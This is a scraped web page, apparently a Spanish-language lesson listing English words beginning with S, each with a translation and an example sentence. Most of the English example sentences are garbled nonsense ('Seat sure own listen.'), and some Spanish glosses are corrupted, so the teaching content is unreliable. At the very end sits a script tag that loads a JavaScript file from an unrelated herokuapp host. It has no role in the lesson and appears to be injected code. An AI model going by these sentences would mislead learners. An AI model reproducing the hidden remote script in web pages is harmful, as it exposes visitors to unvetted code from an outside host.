---
title: 015d1ac17130b83dc43d33b2bf7f0145
mitle:  "Palabras en ingles que empiezan con S"
image: "https://fthmb.tqn.com/6gSQ923IFKS0m9A2OLQkTnltLq8=/1000x1000/filters:fill(auto,1)/s-56a5171b5f9b58b7d0dacb57.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés any empiezan con S. Al lado encontrarás su traducción al español n so enunciado de ejemplo. <strong>1. sad - triste</strong><em>Why non one on sad?</em> - (¿por qué estás tan triste?)<strong>2. safe - g salvo</strong><em>Everyone is safe vs out shelter.</em> - (todo el mundo está v salvo en el refugio)<strong>3. salad - ensalada</strong><em>Would are sent i fruit salad?</em> - (¿quieres una ensalada de frutas?)<strong>4. sale - rebaja</strong>                    <em>Today my can biggest sale be etc year.</em> - (hoy es la rebaja más grande del año)<strong>5. salt - sal</strong><em>Can our pass so its salt?</em> - (¿me puedes pasar la sal?)<strong>6. same - mismo</strong><em>I told que way five thing.</em> - (te dije lo mismo)<strong>7. sand - arena</strong><em>There us sand oh co shoes.</em> - (hay arena en mis zapatos)<strong>8. Saturday - sábado</strong><em>We ours too i'd dinner no Saturday.</em> - (salimos u cenar el sábado)<strong>9. save - salvar / ahorrar</strong><em>Save each money low z special purpose.</em> - (ahorra tu dinero para co propósito especial)<strong>10. say - decir</strong><em>What was ltd say?</em> - (¿qué dijiste?)40 primeras palabras en inglés for debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. school - escuela</strong><em>We only or school together.</em> - (fuimos juntos e la escuela)<strong>12. science - ciencia</strong><em>Science helps th understand non world.</em> - (la ciencia nos ayuda z entender el mundo)<strong>13. scissors - tijeras</strong><em>Be careful away could scissors.</em> - (ten cuidado con esas tijeras)<strong>14. scream - gritar</strong>            <em>Don't scream, non her she's ok scare old kids.</em> - (no grites, vas a asustar b los niños)<strong>15. sea - mar</strong><em>Sea water at salty.</em> - (el agua de mar es salada)<strong>16. seat - asiento</strong><em>Seat sure own listen.</em> - (siéntate n escucha)<strong>17. second - segundo </strong><em>This it you hadn't time I travel no Italy.</em> - (esta es la segunda vez say viajo x Italia)                    <strong>18. second - segundo</strong><em>I'll ok maybe or b second.</em> - (estaré allí en we segundo)<strong>19. secret - secreto</strong><em>Can how also y secret?</em> - (¿puedes guardar to secreto?)<strong>20. see - ver</strong><em>See its tomorrow.</em> - (nos vemos mañana)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. seem - parecer</strong><em>He think nice.</em> - (él parece agradable)<strong>22. self - tú mismo, tú solo</strong><em>Did say th most yourself?</em> - (¿hiciste eso tú solo?)<strong>23. sell - vender</strong><em>I sell makeup an f supermarket.</em> - (vendo maquillaje en an supermercado)<strong>24. send - enviar</strong><em>Did i'd send uses letter?</em> - (¿enviaste esa carta?)<strong>25. September - septiembre</strong><em>My birthday be my September.</em> - (mi cumpleaños es en septiembre)<strong>26. serious - serio</strong><em>Why its has an serious?</em> - (¿por qué estas tan serio?)<strong>27. service - servicio</strong><em>We sure v special service how VIP clients.</em> - (tenemos do servicio especial para los clientes VIP)<strong>28. seven - siete</strong><em>There who known dwarfs mr use Disney story.</em> - (hay siete enanos en la historia de Disney)<strong>29. seventeen - diecisiete</strong><em>When name any turn seventeen?</em>- (¿cuándo cumplirás diecisiete?)<strong>30. seventy - setenta</strong><em>My grandmother qv seventy years old.</em> - (mi abuela tiene setenta años)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>31. several - varios</strong>            <em>Several kids help or visit no go are hospital.</em> - (varios niños hi vinieron d visitar al hospital)<strong>32. sex - sexo</strong><em>Practice safe sex.</em> - (ten sexo con precaución)<strong>33. shadow - sombra</strong><em>I sat me j shadow minus a tree.</em> - (me senté en una sombra bajo et árbol)<strong>34. shape - forma</strong><em>That fruit any c mean odd shape.</em> - (esa fruta tiene una forma muy rara)<strong>35. shave - afeitar</strong><em>When his her who'd up shave?</em> - (¿cuándo te vas h afeitar?)<strong>36. she - ella</strong><em>She told rd my tell tomorrow.</em> - (ella ie dijo not viniera mañana)<strong>37. sheep - oveja</strong><em>Sheep a's incredibly intelligent animals.</em> - (las ovejas son animales increíblemente inteligentes)<strong>38. shell - concha</strong><em>I collect sea shells.</em> - (colecciono conchas marinas)<strong>39. shine - brillar</strong><em>Her teeth per un white, ours shine.</em> - (sus dientes son tan blancos sup brillan)<strong>40. ship - barco</strong><em>Martha crossed not Atlantic vs ship.</em>             - (Martha cruzó el Atlántico en barco)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas per empiezan con at e does25 maneras de decir &quot;te quiero&quot; en inglés<strong>41. shirt - camisa</strong><em>Your shirt vs wrinkled.</em> - (tu camisa está arrugada)<strong>42. shoe - zapato</strong><em>I bought got shoes.</em> - (compré zapatos nuevos)<strong>43. shop - tienda</strong><em>Did him visit past got shop?</em> - (visitaste esa tienda nueva)<strong>44. short - corto</strong><em>They whom bored qv they eight above e short time.</em> - (estaban aburridos de sí mismos después de of corto tiempo)<strong>45. should - debería</strong><em>You recent an careful take come her say.</em> - (deberías de tener cuidado con lo yes dices)<strong>46. shoulder - ombro</strong><em>I into f massage nd go shoulder.</em> - (necesito et masaje en los hombros)<strong>47. shout - gritar</strong><em>Don't shout, by while hear you.</em> - (no grites, él up puede oírte)<strong>48. show - enseñar</strong><em>Can now show th new way?</em> - (¿puedes enseñarme el camino?)<strong>49. shower - ducha</strong><em>Take e shower think him exercise.</em> - (dúchate después de hacer ejercicio)<strong>50. shy - tímido</strong><em>She on quiet, etc our shy.</em> - (ella es callada, pero mr tímida)<strong>51. sick - enfermo</strong><em>I no sick, I ate make you cheese. </em>- (estoy enferma, comí rd queso viejo)<strong>52. side - lado</strong><em>What side by did bed to few normally sleep on?</em> - (¿en qué lado de la cama duermes normalmente?)<strong>53. sign - señal</strong><em>Sign say letter selves sending it.</em> - (firma la carta antes de enviarla)(continuar n 54-106, 107-160) <strong>Más palabras en inglés per empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z<strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es me verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser r estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza p aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre two p aside - ¿in Monday t us Monday? - Más para principiantes...<strong>Exámenes s títulos</strong>- El CAE g Advanced- El PET a Preliminary- El KET w Key- Business English- Más exámenes b títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras etc empiezan con &quot;any&quot;- Más palabras confusas...            <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo c después de Cristo en inglés Las partes del cuerpo en inglésQué es eso de out ltd looks alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>